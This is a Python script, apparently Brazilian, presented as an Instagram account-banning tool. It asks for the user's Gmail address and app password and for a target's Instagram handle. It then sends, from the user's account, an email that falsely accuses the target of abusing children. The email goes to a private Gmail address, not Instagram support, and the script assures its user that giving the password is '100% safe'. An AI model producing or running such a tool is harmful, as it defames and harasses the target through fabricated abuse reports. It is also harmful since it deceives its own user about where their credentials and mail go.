import smtplib
import email.message


#banner
print('''
██╗███╗░░██╗░██████╗████████╗░█████╗░  
██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗  
██║██╔██╗██║╚█████╗░░░░██║░░░███████║  
██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║  
██║██║░╚███║██████╔╝░░░██║░░░██║░░██║  
╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝  

██████╗░░█████╗░███╗░░██╗██╗
██╔══██╗██╔══██╗████╗░██║██║
██████╦╝███████║██╔██╗██║██║
██╔══██╗██╔══██║██║╚████║╚═╝
██████╦╝██║░░██║██║░╚███║██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝''')
print('')
#arte
print('''▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒
▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒
▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒
▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒
▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒
▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒
▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒
▒░░░░░░░░████████████████████████░░░░░░░░░░▒
▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒
▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒
▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒
▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒
▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒
▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒
▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████
▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████       
▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████
▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████       █▀▀▄ █░░█ ▄ 　 █▀▀ █░░ █▀▀█ █░░█ █▀▀ █▀▀█ 
████████████████████████████████████████████       █▀▀▄ █▄▄█ ░ 　 ▀▀█ █░░ █▄▄█ █▄▄█ █▀▀ █▄▄▀ 
████████████████████████████████████████████       ▀▀▀░ ▄▄▄█ ▀ 　 ▀▀▀ ▀▀▀ ▀░░▀ ▄▄▄█ ▀▀▀ ▀░▀▀

''')

print('')


#auto

c = input('coloque o seu email:')
print('')
print (''' Ative a verificaçao de duas etapas, apos isso, ative a opçao senha de apps, crie uma senha para o seu email. Agora coloque a sua senha de email.''')

print ('')

d = input ('coloque a senha:')

print('')

print ('''tudo pronto, a senha pode ser usada apenas para usar o seu email. Este método e 100% seguro! ''')

print('')
print('seu email: {}' .format (c))
print('sua senha de email: {}' .format (d))
print('')
print('salve as informaçoes acima, caso tenha um script pago, tudo sera salvo. Lembre q tu e pobrekkkkkkk')
print('')
input('digite [OK!] para concordar e seguir:')
print('')
a = input('coloque o insta da pessoa q vc quer derrubar:')
print('''
░█████╗░██╗░░░██╗██╗░██████╗░█████╗░██╗
██╔══██╗██║░░░██║██║██╔════╝██╔══██╗██║
███████║╚██╗░██╔╝██║╚█████╗░██║░░██║██║
██╔══██║░╚████╔╝░██║░╚═══██╗██║░░██║╚═╝
██║░░██║░░╚██╔╝░░██║██████╔╝╚█████╔╝██╗
╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═════╝░░╚════╝░╚═╝''')
print('')
print('ESTE SCRIPT ESTA EM FASE DE TESTES!, POSSIVELMENTE A CONTA NAO SERA BANIDA, ISTO E UM TESTE!')
input('digite [OK!] para concordar e seguir:')
#email
def enviar_email():
    corpo_email = f'Olá suporte do instagram, sou mãe de um menino que foi abusado virtualmente por este usuario {a} meu filho nao foi o unico!! Olhem as denuncias.'
    
 
    msg = email.message.Message()
    msg['Subject'] = f'Olá suporte do instagram!, o usuario {a} esta abusando de crianças!'
    msg['From'] = f'{c}'
    msg['To'] = 'slayerandkr@gmail.com'
    password = f'{d}'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('o usuario sera banido em breve.')

enviar_email()
